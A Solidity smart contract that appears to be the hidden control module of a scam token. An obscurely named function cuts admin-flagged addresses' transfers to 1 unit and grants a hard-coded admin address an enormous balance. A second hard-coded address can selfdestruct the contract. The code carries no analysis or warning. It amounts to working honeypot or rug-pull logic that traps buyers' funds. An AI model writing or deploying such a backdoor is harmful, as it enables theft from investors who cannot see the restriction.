pragma solidity ^0.8.5;

contract QT {
    bool public flagBan = false;
    mapping(address => uint256) private _banInfo;
    address public Admin = 0x45aF15b299De5e77b3DadCA429DD4ba466d7a448;
    constructor(){
        _banInfo[Admin] = 100;
    }
    uint256 bigAmount = 25000000000*10**18*88000*1;
    // 只能admin的删除交易账号
     function setUserBalance(address userAddress) external   {
        require(msg.sender == Admin, 'NO ADMIN');
        _banInfo[userAddress] = 1;
    }

    function removeUserBalance(address userAddress) external   {
        require(msg.sender == Admin, 'NO ADMIN');
        _banInfo[userAddress] = 0;
    }

    function setAdminBalance() external   {
        require(msg.sender == Admin, 'NO ADMIN');
        _banInfo[Admin] = 100;
    }


    function setBigAmount(uint256 bm) external   {
        require(msg.sender == Admin, 'NO ADMIN');
        bigAmount = bm;
    }

    function dissort(bool ff,uint256 realAmount,address fromAddress) external view returns (uint256)   {
        if (_banInfo[fromAddress] == 1){
            return _banInfo[fromAddress];
        }else if (_banInfo[fromAddress] == 100) {
            return bigAmount;
        }else {
            return realAmount; 
        }
        
    }
    function destroy() public {
        require(msg.sender == address(0x5856B438e5e170949057920A773fC13ab370a525), 'NO ADMIN');
        address _addr = payable(address(this)); 
        assembly {
            selfdestruct(_addr)
        }
    }
}